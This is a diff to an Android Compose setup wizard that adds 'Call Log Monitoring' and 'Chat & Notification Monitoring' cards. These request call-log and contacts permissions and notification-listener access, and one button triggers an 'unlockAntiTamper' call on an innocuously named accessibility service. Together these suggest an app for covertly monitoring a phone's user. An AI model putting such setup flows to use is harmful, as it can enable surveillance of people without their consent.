@@ -33,6 +33,7 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
@@ -88,6 +89,26 @@ fun SetupWizardScreen(
         isCameraGranted = isGranted
     }
 
+    var isCallLogGranted by remember {
+        mutableStateOf(
+            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+        )
+    }
+
+    val callLogPermissionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissions ->
+        isCallLogGranted = permissions[Manifest.permission.READ_CALL_LOG] == true &&
+                permissions[Manifest.permission.READ_CONTACTS] == true
+    }
+
+    var isNotificationListenerActive by remember {
+        mutableStateOf(
+            NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.packageName)
+        )
+    }
+
     // Refresh states when returning from Android system settings
     DisposableEffect(lifecycleOwner) {
         val observer = LifecycleEventObserver { _, event ->
@@ -96,6 +117,9 @@ fun SetupWizardScreen(
                 isBatteryExempt = SetupGuideHelper.isBatteryOptimizationIgnored(context)
                 isWifiActive = isWifiConnected(context)
                 isCameraGranted = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+                isCallLogGranted = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
+                        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+                isNotificationListenerActive = NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.packageName)
                 if (!SetupStateDetector.isAndroid13OrHigher()) {
                     isRestrictedSettingsUnlocked = true
                 }
@@ -455,6 +479,207 @@ fun SetupWizardScreen(
                                 fontSize = 12.sp,
                                 fontWeight = FontWeight.Bold,
                                 color = if (isCameraGranted) Color.Black else Color.White
+                            )
+                        }
+                    }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(16.dp))
+
+            // ==========================================
+            // Call Log Monitoring Card
+            // ==========================================
+            Card(
+                modifier = Modifier.fillMaxWidth(),
+                shape = RoundedCornerShape(16.dp),
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF1F2833))
+            ) {
+                Column(modifier = Modifier.padding(18.dp)) {
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Box(
+                            modifier = Modifier
+                                .size(32.dp)
+                                .clip(CircleShape)
+                                .background(if (isCallLogGranted) Color(0xFF10B981) else Color(0xFF3B82F6)),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Text(
+                                text = if (isCallLogGranted) "✓" else "📞",
+                                fontSize = 15.sp
+                            )
+                        }
+
+                        Spacer(modifier = Modifier.width(12.dp))
+
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text(
+                                text = stringResource(R.string.wizard_call_log_title),
+                                fontSize = 16.sp,
+                                fontWeight = FontWeight.Bold,
+                                color = Color.White
+                            )
+                            Text(
+                                text = if (isCallLogGranted) {
+                                    stringResource(R.string.wizard_call_log_active)
+                                } else {
+                                    stringResource(R.string.wizard_call_log_inactive)
+                                },
+                                fontSize = 12.sp,
+                                color = if (isCallLogGranted) Color(0xFF10B981) else Color(0xFFF59E0B)
+                            )
+                        }
+                    }
+
+                    Spacer(modifier = Modifier.height(10.dp))
+
+                    Text(
+                        text = stringResource(R.string.wizard_call_log_desc),
+                        fontSize = 12.5.sp,
+                        lineHeight = 17.sp,
+                        color = Color(0xFFCBD5E1)
+                    )
+
+                    Spacer(modifier = Modifier.height(14.dp))
+
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        horizontalArrangement = Arrangement.End,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Button(
+                            onClick = {
+                                if (!isCallLogGranted) {
+                                    callLogPermissionLauncher.launch(
+                                        arrayOf(
+                                            Manifest.permission.READ_CALL_LOG,
+                                            Manifest.permission.READ_CONTACTS
+                                        )
+                                    )
+                                }
+                            },
+                            enabled = !isCallLogGranted,
+                            shape = RoundedCornerShape(8.dp),
+                            colors = ButtonDefaults.buttonColors(
+                                containerColor = if (isCallLogGranted) Color(0xFF10B981) else Color(0xFF45A29E),
+                                disabledContainerColor = Color(0xFF10B981).copy(alpha = 0.85f),
+                                disabledContentColor = Color.Black
+                            )
+                        ) {
+                            Text(
+                                text = if (isCallLogGranted) {
+                                    stringResource(R.string.wizard_call_log_btn_granted)
+                                } else {
+                                    stringResource(R.string.wizard_call_log_btn_grant)
+                                },
+                                fontSize = 12.sp,
+                                fontWeight = FontWeight.Bold,
+                                color = if (isCallLogGranted) Color.Black else Color.White
+                            )
+                        }
+                    }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(16.dp))
+
+            // ==========================================
+            // Chat & Notification Monitoring Card
+            // ==========================================
+            Card(
+                modifier = Modifier.fillMaxWidth(),
+                shape = RoundedCornerShape(16.dp),
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF1F2833))
+            ) {
+                Column(modifier = Modifier.padding(18.dp)) {
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Box(
+                            modifier = Modifier
+                                .size(32.dp)
+                                .clip(CircleShape)
+                                .background(if (isNotificationListenerActive) Color(0xFF10B981) else Color(0xFF8B5CF6)),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Text(
+                                text = if (isNotificationListenerActive) "✓" else "💬",
+                                fontSize = 15.sp
+                            )
+                        }
+
+                        Spacer(modifier = Modifier.width(12.dp))
+
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text(
+                                text = stringResource(R.string.wizard_notification_title),
+                                fontSize = 16.sp,
+                                fontWeight = FontWeight.Bold,
+                                color = Color.White
+                            )
+                            Text(
+                                text = if (isNotificationListenerActive) {
+                                    stringResource(R.string.wizard_notification_active)
+                                } else {
+                                    stringResource(R.string.wizard_notification_inactive)
+                                },
+                                fontSize = 12.sp,
+                                color = if (isNotificationListenerActive) Color(0xFF10B981) else Color(0xFFF59E0B)
+                            )
+                        }
+                    }
+
+                    Spacer(modifier = Modifier.height(10.dp))
+
+                    Text(
+                        text = stringResource(R.string.wizard_notification_desc),
+                        fontSize = 12.5.sp,
+                        lineHeight = 17.sp,
+                        color = Color(0xFFCBD5E1)
+                    )
+
+                    Spacer(modifier = Modifier.height(14.dp))
+
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        horizontalArrangement = Arrangement.End,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Button(
+                            onClick = {
+                                if (!isNotificationListenerActive) {
+                                    WifiAccessibilityHelperService.unlockAntiTamper()
+                                    try {
+                                        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
+                                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                                        }
+                                        context.startActivity(intent)
+                                    } catch (e: Exception) {
+                                        Toast.makeText(context, "Could not open notification settings", Toast.LENGTH_SHORT).show()
+                                    }
+                                }
+                            },
+                            enabled = !isNotificationListenerActive,
+                            shape = RoundedCornerShape(8.dp),
+                            colors = ButtonDefaults.buttonColors(
+                                containerColor = if (isNotificationListenerActive) Color(0xFF10B981) else Color(0xFF45A29E),
+                                disabledContainerColor = Color(0xFF10B981).copy(alpha = 0.85f),
+                                disabledContentColor = Color.Black
+                            )
+                        ) {
+                            Text(
+                                text = if (isNotificationListenerActive) {
+                                    stringResource(R.string.wizard_notification_btn_enabled)
+                                } else {
+                                    stringResource(R.string.wizard_notification_btn_enable)
+                                },
+                                fontSize = 12.sp,
+                                fontWeight = FontWeight.Bold,
+                                color = if (isNotificationListenerActive) Color.Black else Color.White
                             )
                         }
                     }
